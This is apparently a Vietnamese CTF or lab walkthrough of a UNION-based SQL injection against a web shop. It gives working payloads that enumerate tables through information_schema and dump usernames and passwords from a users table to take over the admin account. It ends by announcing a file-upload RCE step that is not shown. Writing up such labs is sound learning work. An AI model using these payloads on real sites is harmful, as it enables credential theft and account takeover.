= Khi thử ' thì thấy hiện lỗi cú pháp:
<img width="1700" height="436" alt="image" src="https://github.com/user-attachments/assets/7dd4b08b-b631-4efa-8343-214b16293037" />

=> Bị lỗi SQLi.

= sử dụng '-- - thì thấy trả về rằng trang web có tất cả 125 Records:

<img width="1725" height="905" alt="image" src="https://github.com/user-attachments/assets/b8a42256-4a8e-443f-8d96-85daf467aa89" />

= Tìm số cột của CSDL: Khi sử dụng payload `'UNION SELECT 1,2--` thì thấy trả về:
<img width="1439" height="180" alt="image" src="https://github.com/user-attachments/assets/1021b630-0541-4dc7-89eb-d5c8d5dad07c" />

=> Số cột > 2 cột. Thử tiếp mãi đến 15 cột mới thấy trả về đúng:

<img width="1757" height="1065" alt="image" src="https://github.com/user-attachments/assets/a7e4672b-0613-4465-89c6-cd0327839ae3" />

= Lấy dữ liệu thôi. Khi test version() vào 1 thì thấy có:
<img width="1363" height="532" alt="image" src="https://github.com/user-attachments/assets/56451dca-4750-4e57-8514-3e7103ddf86f" />

= Nghĩa là cột thứ 3 render tên sách, cột thứ 6 render ra giá sau khi giảm. Khi gõ `' UNION SELECT 1,2,sql,4,5,6,7,8,9,10,11,12,13,14,15 FROM sql_schema -- -` thì nó báo lỗi như này:
<img width="1648" height="127" alt="image" src="https://github.com/user-attachments/assets/8677d1ba-744a-4aea-832e-170c409d494d" />

= Khi gõ này nó trả về:
<img width="895" height="145" alt="image" src="https://github.com/user-attachments/assets/9068277d-55bb-483f-8ceb-ab19b24e741c" />

=> Nghĩa là cột mình lấy nó đang không phải text, ghép vào không mix.

= Sau khi chuyển `table_name` sang cột 6 (payload: `'UNION SELECT 1,2,3,4,5,table_name,7,8,9,10,11,12,13,14,15 FROM information_schema.tables WHERE table_schema=database()-- -` thì mình đã thu được:

<img width="1611" height="408" alt="image" src="https://github.com/user-attachments/assets/56110bde-83a6-4615-bc82-eee2def62fc2" />

= Vậy là có 4 bảng là `rating`, `users`, `products`, `cart`.

= Đọc thử bảng `users` : `'UNION SELECT 1,2,3,4,5,column_name,7,8,9,10,11,12,13,14,15 FROM information_schema.columns WHERE table_name="users"-- -`
<img width="1597" height="347" alt="image" src="https://github.com/user-attachments/assets/750c65cd-8cf8-4f06-bb60-98ba760fd6a5" />

= Bảng `rating`:
<img width="1060" height="156" alt="image" src="https://github.com/user-attachments/assets/ffb41cb6-98a5-4421-b7b0-b254017f160e" />

= Bảng `products`:
<img width="1565" height="902" alt="image" src="https://github.com/user-attachments/assets/2bf24a00-3263-4803-ad12-eb80d227146d" />

= Bảng `cart`:
<img width="1079" height="191" alt="image" src="https://github.com/user-attachments/assets/b550188b-9ad3-404c-8923-611c2213229c" />

= Giờ đọc dữ liệu bảng `users` nhé. Sử dụng `'UNION SELECT 1,2,username,4,5,pasword,7,8,9,10,11,12,13,14,15 FROM users-- -`
<img width="1689" height="734" alt="image" src="https://github.com/user-attachments/assets/fcb2ecc7-af1d-4ecb-94b5-d04e3131a7ef" />

= Lấy username, password trong bảng `users` của admin và Đăng nhập vào tài khoản của admin.

= Theo như hỏi hint của anh bạn đã làm rồi thì sau khi mình đăng nhập được vào admin thì mình pải RCE chức năng `Upload file` mới được huhu.
<img width="487" height="142" alt="image" src="https://github.com/user-attachments/assets/196f0ab5-8d86-4a1e-8909-a5c9e877c2ff" />

= Script đây, giờ up lên thôi



